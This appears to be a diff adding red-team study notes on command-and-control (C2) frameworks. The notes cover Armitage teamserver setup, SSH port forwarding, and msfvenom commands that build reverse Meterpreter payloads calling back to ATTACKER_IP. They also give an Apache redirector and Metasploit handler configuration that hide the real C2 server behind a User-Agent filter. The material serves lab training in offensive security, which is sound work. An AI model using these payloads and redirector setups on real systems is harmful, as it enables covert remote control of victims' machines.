@@ -572,3 +572,280 @@ Example: A custom HTTP header such as `X-C2-Server` helps the C2 server distingu
 
 **Remember:** C2 Server = Control center, Agent = Controlled machine, Listener = Waiting for connections, Beacon = Callback, Modules = Extra capabilities.
 
+
+#### ----------------------------------- Common C2 Frameworks -----------------------------------
+
+## **Common C2 Frameworks**
+
+### **Free C2 Frameworks**
+
+| Framework                          | Key points                                                                                                                                                        |
+| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Metasploit**                     | Developed by Rapid7. Popular exploitation and post-exploitation framework.                                                                                        |
+| **Armitage**                       | Metasploit GUI extension written in Java. Provides target enumeration and visualization. **Hail Mary** attempts all exploits against a target's running services. |
+| **PowerShell Empire / Starkiller** | Empire supports agents written in different languages and multiple platforms. Starkiller provides a GUI. Maintained by BC Security.                               |
+| **Covenant**                       | Written in C#. Focuses on post-exploitation and lateral movement. Supports HTTP, HTTPS and SMB listeners with customizable agents.                                |
+| **Sliver**                         | Developed by Bishop Fox; written in Go. Multi-user, customizable CLI-based C2. Supports WireGuard, mTLS, HTTP(S), DNS and BOF files.                              |
+
+### **Paid C2 Frameworks**
+
+| Framework            | Key points                                                                                                                                  |
+| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Cobalt Strike**    | Originally created by Raphael Mudge. Java-based C2 for Red Team operations. Supports advanced features, including VPN tunnels from beacons. |
+| **Brute Ratel (C4)** | Created by Chetan Nayak (Paranoid Ninja). Customizable Command and Control Center for adversary simulation.                                 |
+
+### **Important Concepts**
+
+- **Paid C2:** Often offers advanced post-exploitation, pivoting and custom features. May be harder for AV to detect, but is not undetectable.
+- **Open-source C2:** Generally better understood, making signature-based detection easier to develop.
+- **C2 Matrix:** Comprehensive list comparing C2 frameworks and their capabilities.
+
+**Useful links:**
+
+- [Metasploit](https://www.metasploit.com/?utm_source=chatgpt.com)
+- [PowerShell Empire](https://bc-security.gitbook.io/empire-wiki/?utm_source=chatgpt.com)
+- [Starkiller](https://github.com/BC-SECURITY/Starkiller?utm_source=chatgpt.com)
+- [Covenant](https://github.com/cobbr/Covenant?utm_source=chatgpt.com)
+- [Sliver](https://github.com/BishopFox/sliver?utm_source=chatgpt.com)
+- [Cobalt Strike](https://www.cobaltstrike.com/?utm_source=chatgpt.com)
+- [Brute Ratel](https://bruteratel.com/?utm_source=chatgpt.com)
+- [C2 Matrix](https://howto.thec2matrix.com/?utm_source=chatgpt.com)
+
+**Remember:** Free = Metasploit, Armitage, Empire/Starkiller, Covenant, Sliver. Paid = Cobalt Strike, Brute Ratel.
+
+
+#### ----------------------------------- Setting Up a C2 Framework -----------------------------------
+
+**Build:**
+
+```
+git clone https://gitlab.com/kalilinux/packages/armitage.git && cd armitage
+bash package.sh
+cd ./release/unix/
+ls -la
+```
+
+Build output: `BUILD SUCCESSFUL`
+
+**Important files:**
+
+- `teamserver` – Starts C2 server; requires IP and shared password.
+- `armitage` – Client used by operators to connect.
+
+**PostgreSQL & Metasploit DB:**
+
+```
+systemctl start postgresql && systemctl status postgresql
+export MSF_DATABASE_CONFIG=/root/.msf4/database.yml
+```
+
+**Start Teamserver:**
+
+```
+./teamserver YourIP P@ssw0rd123
+```
+
+**Start Client:**
+
+```
+./armitage
+```
+
+**Important technical details:**
+
+| Port / Setting  | Purpose                                               |
+| --------------- | ----------------------------------------------------- |
+| `55553`         | Armitage Teamserver                                   |
+| `55554`         | Metasploit RPC                                        |
+| `127.0.0.1`     | Localhost; Armitage does not allow it as listening IP |
+| `tun0` / `eth0` | Use the appropriate interface IP                      |
+
+**Security:** Never expose the C2 management interface publicly. Give operators separate accounts and use SSH port forwarding to access TCP `55553`.
+
+**Remember:** PostgreSQL + Metasploit DB are required. `teamserver` starts the server; `armitage` connects the client.
+
+
+#### ----------------------------------- C2 Operation Basics -----------------------------------
+
+#### **C2 Operation Basics**
+
+**C2 Server:** Used to control compromised machines remotely.
+
+**OPSEC:** Never expose the C2 management interface publicly. Attackers/defenders can fingerprint it (e.g., Cobalt Strike before v3.13 had an extra HTTP space `\x20`).
+
+**Protection:** Use SSH port forwarding, firewall rules, Security Groups, UFW, or IPTables.
+
+#### **SSH Port Forwarding**
+
+Access a remote C2 server securely through SSH (TCP/22), even when its management port is blocked.
+
+```
+ssh -L 55553:127.0.0.1:55553 root@192.168.0.44
+```
+
+Local port `55553` → Remote C2 port `55553`.
+
+**Note:** Armitage cannot listen on loopback (`127.0.0.1-127.255.255.255`).
+
+#### **Armitage Listener**
+
+**Listener:** Waits for a connection from a target.
+
+**Bind:** You connect to the target.
+
+**Reverse:** Target connects back to you.
+
+**Shell:** Basic reverse shell.
+
+**Meterpreter:** Advanced Metasploit shell.
+
+Armitage → Listeners → Reverse → Meterpreter → Port `31337`.
+
+#### **MSFvenom Payload**
+
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe -o shell.exe
+```
+
+`LHOST` = Attacker IP, `LPORT` = Listener port, `-f exe` = EXE format, `-o` = Output file.
+
+Running `shell.exe` on the lab target sends a callback to the listener.
+
+#### **Listener Types**
+
+| Type               | Main concept                                       |
+| ------------------ | -------------------------------------------------- |
+| Standard (TCP/UDP) | Direct communication, often cleartext              |
+| HTTP/HTTPS         | Uses web traffic; HTTPS can blend in               |
+| DNS                | Uses DNS; useful for proxy bypass and exfiltration |
+| SMB                | Uses named pipes; useful for internal pivoting     |
+
+**Remember:** DNS C2 often needs a domain and public NS server. SMB allows multiple machines to communicate while only one connects outward.
+
+Metasploit supports TCP/UDP, HTTP/HTTPS, and SMB named pipes. DNS C2 may require extra tools.
+
+[TASK 6 - LABS](https://medium.com/@DaRkrAi69/intro-to-c2-c66fe9e9b083)
+
+#### ----------------------------------- Advanced C2 Setups -----------------------------------
+
+**Problem with Metasploit:** Limited C2 features. No configurable beacon interval or jitter, making traffic easy to detect by NGFW.
+
+#### **C2 Redirector**
+
+**Redirector:** A middle server that forwards HTTP/HTTPS requests to the real C2 server based on request information (e.g., User-Agent).
+
+**Purpose:** Hide the real C2 server. If the redirector gets reported, the actual C2 server stays protected.
+
+**Common tools:** Apache2, NGINX, Load Balancer.
+
+**Important:** Firewall should only allow the redirector to communicate with the real C2 server.
+
+#### **Apache2 Setup**
+
+Required modules:
+
+`rewrite`, `proxy`, `proxy_http`, `headers`
+
+Install and enable:
+
+```
+apt install apache2
+
+a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
+```
+
+**Note:** AttackBox already uses port 80. Change Apache's port in `/etc/apache2/ports.conf` before starting it.
+
+#### **Modified HTTP User-Agent**
+
+User-Agent is an HTTP header that identifies the client. It can be modified to help identify which requests should be forwarded.
+
+Generate payload:
+
+```
+msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+```
+
+Wireshark HTTP filter: `http`
+
+#### **Apache Redirector Configuration**
+
+Config file:
+
+`/etc/apache2/sites-available/000-default.conf`
+
+Important directives:
+
+| Directive          | Meaning                            |
+| ------------------ | ---------------------------------- |
+| `RewriteEngine On` | Enable rewrite rules               |
+| `RewriteCond`      | Check HTTP request conditions      |
+| `ProxyPass`        | Forward requests to another server |
+
+Example configuration:
+
+```
+<VirtualHost *:80>
+
+    ServerAdmin webmaster@localhost
+    DocumentRoot /var/www/html
+
+    RewriteEngine On
+    RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
+    ProxyPass "/" "http://localhost:8080/"
+
+    <Directory>
+        AllowOverride All
+    </Directory>
+
+    ErrorLog ${APACHE_LOG_DIR}/error.log
+    CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+```
+
+`^` = Beginning of string.
+
+`$` = End of string.
+
+`^NotMeterpreter$` = Matches only the exact User-Agent `NotMeterpreter`.
+
+Reference: [Apache mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html?utm_source=chatgpt.com)
+
+#### **Metasploit Redirector Configuration**
+
+```
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_http
+set LHOST 127.0.0.1
+set LPORT 8080
+set ReverseListenerBindAddress 127.0.0.1
+set ReverseListenerBindPort 8080
+set OverrideLHOST 192.168.0.44
+set OverrideLPORT 80
+set HttpUserAgent NotMeterpreter
+set OverrideRequestHost true
+run
+```
+
+| Option                       | Meaning                                      |
+| ---------------------------- | -------------------------------------------- |
+| `LHOST`                      | Internal C2 listening IP                     |
+| `LPORT`                      | Internal C2 listening port                   |
+| `ReverseListenerBindAddress` | Address where handler listens                |
+| `ReverseListenerBindPort`    | Handler listening port                       |
+| `OverrideLHOST`              | Redirector IP/domain                         |
+| `OverrideLPORT`              | Redirector port                              |
+| `HttpUserAgent`              | Expected User-Agent                          |
+| `OverrideRequestHost`        | Makes payload communicate through redirector |
+
+#### **Remember**
+
+**Communication flow:**
+
+`Victim → Redirector (Apache2) → C2 Server (Metasploit)`
+
+Use multiple redirectors and DNS records in real engagements instead of relying on IP addresses alone.
+
+
